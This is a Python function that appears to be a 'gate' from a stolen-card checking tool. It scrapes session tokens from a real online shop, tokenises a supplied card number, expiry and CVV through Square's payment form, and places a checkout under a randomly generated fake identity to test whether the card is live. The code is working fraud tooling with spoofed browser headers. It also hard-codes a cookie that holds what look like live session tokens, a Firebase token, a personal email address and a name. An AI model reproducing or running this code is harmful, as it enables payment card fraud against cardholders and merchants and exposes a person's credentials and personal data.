from .util import __extract_str
import requests
import string
import random
import json

def check_sole(cc, identity=None):

	try:

		gate_url = "https://sole.scvr.co/"
		gate2_url = "https://js.squareup.com/v2/paymentform"
		gate3_url = "https://sole.scvr.co/shop/checkout"
		gate4_url = "https://pci-connect.squareup.com/v2/iframe?type=main&app_id={}&host_name=sole.scvr.co&location_id={}&version={}"
		gate5_url = "https://pci-connect.squareup.com/v2/card-nonce?_=1628597480154.{}&version={}"
		gate6_url = "https://sole.scvr.co/graphql"
		gate_user_agent = "Mozilla/5.0 (Windows NT {}.0; Win64; x64) AppleWebKit/{}.{} (KHTML, like Gecko) Chrome/{}.0.{}.{} Mobile DuckDuckGo/5 Safari/{}.{}".format(random.randint(11, 99),
			random.randint(111, 999),
			random.randint(11, 99),
			random.randint(11, 99),
			random.randint(1111, 9999),
			random.randint(111, 999),
			random.randint(111, 999),
			random.randint(11, 99))
		splitted_card = cc.split("|")

		payment_header = {
			'Authority': 'sole.scvr.co',
			'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
			'User-agent': gate_user_agent,
			'Accept-language': 'en-IN,en-US;q=0.9,en;q=0.8'
		}

		payment_request = requests.get(gate_url, headers=payment_header)

		if payment_request.status_code < 300:

			lsess = __extract_str(payment_request.text, '_MyLocal2_session=', ';')
			xref = __extract_str(payment_request.text, 'XSRF-TOKEN=', ';')
			sessid = __extract_str(payment_request.text, '_session_id=', ';')

			payment_header = {
				'Authority': 'js.squareup.com',
				'Accept': '*/*',
				'User-agent': gate_user_agent
			} 

			payment_request = requests.get(gate2_url, headers=payment_header)

			if payment_request.status_code < 300:

				jsid = __extract_str(payment_request.text, 'version:"', '"})')

				payment_header = {
					'Authority': 'sole.scvr.co',
					'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
					'Accept-language': 'en-US,en;q=0.9',
					'Content-type': 'application/json; charset=UTF-8',
					'Referer': 'https://sole.scvr.co/gift-cards',
					'Sec-fetch-mode': 'cors',
					'Sec-fetch-site': 'same-origin'
				} 

				payment_request = requests.get(gate3_url, headers=payment_header)

				if payment_request.status_code < 300:

					sess = __extract_str(payment_request.text, "window.squareApplicationId = '", "';")
					lid = __extract_str(payment_request.text, "window.squareLocationId    = '", "';")

					payment_header = {
						'Host': 'pci-connect.squareup.com',
						'User-agent': gate_user_agent,
						'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
						# 'x-requested-with: com.duckduckgo.mobile.android',
						'Sec-fetch-site': 'cross-site',
						'Sec-fetch-mode': 'navigate',
						'Sec-fetch-dest': 'iframe',
						'Referer': 'https://sole.scvr.co/',
						'Accept-language': 'en-IN,en-US;q=0.9,en;q=0.8'
					} 
					
					payment_request = requests.get(gate4_url.format(sess, lid, jsid), headers=payment_header)

					if payment_request.status_code < 300:

						sestr = __extract_str(payment_request.text, 'pi=di,fi="', '",')

						payment_header = {
							'Authority': 'pci-connect.squareup.com',
							'Accept': 'application/json',
							'Accept-language': 'en-US,en;q=0.9',
							'Content-type': 'application/json; charset=UTF-8',
							'Origin': 'https://pci-connect.squareup.com',
							'Referer': gate4_url.format(sess, lid, jsid),
							'Sec-fetch-mode': 'cors',
							'Sec-fetch-site': 'same-origin'
						} 

						payment_data = '{{"client_id":"{}","location_id":"{}","session_id":"{}","website_url":"https://sole.scvr.co/","squarejs_version":"{}","analytics_token":"{}","card_data":{{"number":"{}","exp_month":{},"exp_year":{},"cvv":"{}","billing_postal_code":"{}"}}'.format(sess,
							lid,
							sestr,
							jsid,
							''.join(random.choice(string.ascii_letters) for x in range(96)),
							splitted_card[0],
							splitted_card[1],
							splitted_card[2],
							splitted_card[3],
							identity["results"][0]["location"]["postcode"])

						payment_request = requests.post(gate5_url.format(random.randint(1000, 9999), jsid), headers=payment_header, data=payment_data)

						if payment_request.status_code < 300:

							cnon = payment_request.json()['card_nonce']

							payment_header = {
								'Accept': '*/*',
								'Accept-Language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6',
								'Cookie': '_lr_hb_-gcg1ox%2Fsociavore={%22heartbeat%22:1628597406597};_lr_uf_-gcg1ox=7c4114d4-11dc-4afa-8eab-c2aa6a25848b;sociavore_user_v2=%7B%22id%22%3A6714589%2C%22email%22%3A%22roldexstark%40gmail.com%22%2C%22name%22%3A%22Rahul+Kumar%22%2C%22anonymous%22%3Afalse%2C%22chats%22%3A%5B%5D%2C%22firebase_id%22%3A%22-Mfn0FLgOIoPzRDOz9AG%22%2C%22user_id%22%3A%2228dcaaac-2fec-43d5-8223-cb86c9d75b4f%22%2C%22firebase_token%22%3A%22eyJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJmaXJlYmFzZS1hZG1pbnNkay16c2dib0Bzb2NpYXZvcmUtcHJvZC5pYW0uZ3NlcnZpY2VhY2NvdW50LmNvbSIsInN1YiI6ImZpcmViYXNlLWFkbWluc2RrLXpzZ2JvQHNvY2lhdm9yZS1wcm9kLmlhbS5nc2VydmljZWFjY291bnQuY29tIiwiYXVkIjoiaHR0cHM6Ly9pZGVudGl0eXRvb2xraXQuZ29vZ2xlYXBpcy5jb20vZ29vZ2xlLmlkZW50aXR5LmlkZW50aXR5dG9vbGtpdC52MS5JZGVudGl0eVRvb2xraXQiLCJpYXQiOjE2Mjg1OTc0MjcsImV4cCI6MTYyODYwMTAyNywidWlkIjoiLU1mbjBGTGdPSW9QelJET3o5QUciLCJjbGFpbXMiOnsicGFydGlhbF9ndWVzdCI6dHJ1ZX19.aFDJniV5cC1hYQmBd_oMR0ZJ-sRNuHI8jkvW4Sp4If0cAIYwI2EObrsx3XR1IvfWtaeCs9N0clPDbbOenO4qLlOtS7x2V6QYahB80LA1YCVFAcuNn_TuhHI56bwjh1uHnPPgf6r2sBIu4-297kuczrTvrGkxLcxNxRI71szC9Hreyp-90j3teI9g9ypnyr079k5x5nkfouvSk6y-XmCLrnNsodANF1btFARFg7lm6B7NeVmM4PD-bQzBXV2kUeosoM31lEPCUTNYuSad3pF_xnnQYBHQxaaoLQNXVv_9FYMhyg9puA4dFR_3A7yAt4wTi9HQD5SuJTtwHmVhw1VTkg%22%2C%22firebase_token_expired_at%22%3A%222021-08-10T13%3A09%3A27Z%22%7D;XSRF-TOKEN=b%2FwDKQfVPVrpJCY9ZbK1oXzGLHsp48a%2FDgg7GW9OiegV%2FNBAKNHQzIvGm6ghUgW2UWBM0p952v4l%2B%2FrRdjDR7Q%3D%3D;_MyLocal2_session=aEUvbmdnUk5QY0xLalJFTVhVZ1o5TzVabDIrVHJkT3FJQ09zblBLcmp4MVdXUXRZYVRBUnZDTmV4cTUzb1d6TUZHNVJOMXI0NEtNd0pWTEUvUVJwZDQ4SUZOL29RWUo0TzFhWjVBZnhiV0ZZV2pBVHlyZnJsUGtTU084bElmME1JZk53OHg3bnVQWHlETXRGWXFvQVgxYldZbERXTkh0bjJ0Z3cydjlCVG1EbkQ5akhhMnN4V1RkRm5td1ovYm50LS0xQ3NjUFQxTTU2RmtDSTRTYkFiTHRBPT0%3D--e6a8897c3871c1389d35e1e8c5bab928beb35df9;_session_id=TTYyS1pIVFRMUGpUcWxNTU9DMVBlYkRuQ1N4eDZaY3NnTUxLMW9PZGxGWi9FOE9Pd2dKMW9CUWVORk5VZ1hCd0NWdzhUTzZBZGQyaWRmc25vaSs5RFFKSWRxV2hMNGJBT0JoYldQZXlibW15ZURDaFE3cm1CWjhZZVFOL2p4bXZwRGJKYUdEak9XOFRGY1YxOE5LWTlsSEh4TXdxTVN6VnNMdkFib3ZtNStHRFdIbEwzTFV3MmhBSTRscndTaTdYLS1FcG9kdHBOalAwcWNnaGt1S29yTlVBPT0%3D--eacfd8f1d753a9cb8168a1946619e338cc1aae2c;_lr_tabs_-gcg1ox%2Fsociavore={%22sessionID%22:0%2C%22recordingID%22:%224-9e663b5e-ca36-4995-9af4-bbb963fb2dbb%22%2C%22lastActivity%22:1628597478585}',
								'Content-Type': 'application/json',
								'Host': 'sole.scvr.co',
								'Origin': 'https://sole.scvr.co',
								'Referer': 'https://sole.scvr.co/shop/checkout',
								'Sec-Fetch-Mode': 'cors',
								'user-agent': gate_user_agent,
								'Sec-Fetch-Site': 'same-origin'
							}

							payment_data = '{{"operationName":"Checkout","variables":{{"input":{{"customer":{{"firstName":"{}","lastName":"{}","email":"{}","subscribed":false,"phone":"{}"}},"locationId":"985","fulfillment":{{"kind":"pickup"}},"squarePayment":{{"sourceId":"{}"}},"query":"mutation Checkout($input: CheckoutInput!) {{\n  checkout(input: $input) {{\n    clientMutationId\n    __typename\n  }}\n}}\n"}}'.format(identity["results"][0]["name"]["first"],
								identity["results"][0]["name"]["last"],
								identity["results"][0]["email"],
								identity["results"][0]["phone"],
								cnon)

							payment_request = requests.post(gate6_url, headers=payment_header, data=payment_data)

							if payment_request.status_code < 300:

								return True

							else: return False

						else: return False

					else: return False

				else: return False

			else: return False

		else: return False

	except Exception as E: raise E